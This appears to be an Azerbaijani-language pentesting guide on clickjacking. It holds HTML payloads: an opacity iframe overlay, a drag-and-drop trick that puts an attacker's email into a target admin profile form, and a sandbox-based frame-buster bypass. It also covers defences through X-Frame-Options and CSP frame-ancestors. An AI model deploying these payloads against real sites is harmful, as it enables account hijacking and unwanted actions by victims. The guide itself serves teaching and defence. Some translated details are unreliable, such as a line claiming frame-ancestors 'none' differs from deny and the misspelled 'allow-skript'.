---
title: Clickjacking
---

### Clickjacking nədir

Clickjacking, istifadəçini görünməyən və ya başqa element kimi gizlədilmiş veb-səhifə elementinə klikləməyə aldadan hücumdur. Bu, istifadəçilərin bilmədən zərərli proqram yükləməsinə, zərərli veb səhifələrə baş çəkməsinə, etimadnamələri və ya həssas məlumatları təqdim etməsinə, pul köçürməsinə və ya onlayn məhsul almasına səbəb ola bilər.

### Formaların əvvəlcədən doldurulması hiyləsi

Bəzən səhifəni yükləyərkən GET parametrlərindən istifadə edərək formanın sahələrinin dəyərini doldurmaq mümkündür. Təcavüzkar bu davranışdan sui-istifadə edərək formanı ixtiyari məlumatlarla doldura və istifadəçinin Göndər düyməsini basması üçün klikləmə yükünü göndərə bilər.

### Sürüklə və Burax ilə formanı doldurun

Əgər istifadəçiyə bir formanı doldurmağa ehtiyacınız varsa, lakin siz ondan bəzi xüsusi məlumatları (məsələn, e-poçtunuz və ya bildiyiniz xüsusi parol) yazmasını birbaşa xahiş etmək istəmirsinizsə, siz ondan sadəcə olaraq idarə etdiyiniz şeyi yazacaq nəyisə sürüklə və buraxmağı xahiş edə bilərsiniz.

### Əsas Payload

```html
<style>
  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.1;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 470px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```

### Drag&Drop + Click payload

```html
<html>
  <head>
    <style>
      #payload {
        position: absolute;
        top: 20px;
      }
      iframe {
        width: 1000px;
        height: 675px;
        border: none;
      }
      .xss {
        position: fixed;
        background: #f00;
      }
    </style>
  </head>
  <body>
    <div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">
      .
    </div>
    <div
      style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;"
      class="xss"
    >
      1. Click and press delete button
    </div>
    <div
      style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;"
      class="xss"
    >
      3.Click me
    </div>
    <iframe
      sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts"
      style="opacity:0.3"
      src="https://target.com/panel/administration/profile/"
    ></iframe>
    <div
      id="payload"
      draggable="true"
      ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"
    >
      <h3>2.DRAG ME TO THE RED BOX</h3>
    </div>
  </body>
</html>
```

### XSS + Clickjacking

Əgər siz XSS-i işə salmaq üçün istifadəçidən hansısa elementə klikləməyi tələb edən bir XSS hücumu müəyyən etmisinizsə və səhifə kliklərə qarşı həssasdırsa, istifadəçini düyməyə/linkə klikləməyə aldatmaq üçün ondan sui-istifadə edə bilərsiniz.

## Clickjackingdən necə qaçınmaq olar

### Müştəri tərəfinin müdafiəsi

Clickjacking-in qarşısını almaq üçün aşağıdakı davranışların bəzilərini və ya hamısını yerinə yetirən skriptləri müştəri tərəfində icra etmək mümkündür:

- cari proqram pəncərəsinin əsas və ya yuxarı pəncərə olduğunu yoxlayın və tətbiq edin,
- bütün çərçivələri görünən etmək,
- görünməz çərçivələrə klikləməyin qarşısını almaq,
- istifadəçiyə potensial klik hücumlarını dayandırın və qeyd edin.

### Bypass

Frame busterləri JavaScript olduğundan, brauzerin təhlükəsizlik parametrləri onların işləməsinə mane ola bilər və ya brauzer hətta JavaScript-i dəstəkləməyə bilər. Hücumçuların frame qırmalarına qarşı effektiv həlli HTML5 iframe sandbox atributundan istifadə etməkdir. Bu _allow-forms_ və ya _allow-skript_ dəyərləri ilə təyin edildikdə və _allow-top-navigation_ dəyəri buraxıldıqda, iframe yuxarı pəncərə olub-olmadığını yoxlaya bilmədiyi üçün frame buster skripti zərərsizləşdirilə bilər:

```html
<iframe
  id="victim_website"
  src="https://victim-website.com"
  sandbox="allow-forms allow-scripts"
></iframe>
```

Həm _allow-forms_, həm də _allow-skript_ dəyərləri iframe daxilində göstərilən hərəkətlərə icazə verir, lakin yuxarı səviyyəli naviqasiya deaktiv edilib. Bu, hədəflənmiş sayt daxilində funksionallığa icazə verərkən frame-in məhv edilməsi davranışlarını maneə törədir.

Həyata keçirilən Clickjaking hücumunun növündən asılı olaraq sizə icazə vermək lazım ola bilər: _allow-same-origin_ and _allow-modals_ və ya daha çox. Hücum hazırlayarkən brauzerin konsolunu yoxlamaq kifayətdir, o sizə hansı digər davranışlara icazə verməli olduğunuzu söyləyə bilər.

### X-Frame-Options

X-Frame-Options HTTP cavab başlığından brauzerin səhifəni \<frame\> və ya \<iframe\>-də göstərməsinə icazə verilib-verilmədiyini göstərmək üçün istifadə edilə bilər. Saytlar, məzmununun digər saytlara daxil edilməməsini təmin etməklə, Clickjacking hücumlarından qaçmaq üçün bundan istifadə edə bilər. HTML məzmunu olan bütün cavablar üçün X-Frame-Options başlığını təyin edin. Mümkün dəyərlər bunlardır:

```
X-Frame-Options: deny (Recommended value)
X-Frame-Options: sameorigin
X-Frame-Options: allow-from https://trusted.com
```

Aşağıdakı məhdudiyyətləri yoxlayın, çünki brauzer onu dəstəkləmirsə, bu açılmayacaq.

Digər brauzerlər əvəzinə yeni CSP çərçivə əcdadları direktivini dəstəkləyir. Bir neçəsi hər ikisini dəstəkləyir.

### Məzmun Təhlükəsizlik Siyasəti (CSP) frame-ancestors direktivi

Tövsiyə olunan klikləmə mühafizəsi proqramın Məzmun Təhlükəsizliyi Siyasətinə frame-ancestors direktivini daxil etməkdir.

**Frame-ancestors-un** 'heç biri' direktivi davranış baxımından X-Frame-Options deny direktivinə bənzəmir (Heç kim səhifəni çərçivəyə sala bilməz).

Frame-ancestors 'self' direktivi geniş şəkildə X-Frame-Options sameorigin direktivinə ekvivalentdir (yalnız cari sayt onu çərçivəyə sala bilər).

Frame-ancestors trusted.com direktivi X-Frame-Options allow-fromdirective geniş şəkildə ekvivalentdir.
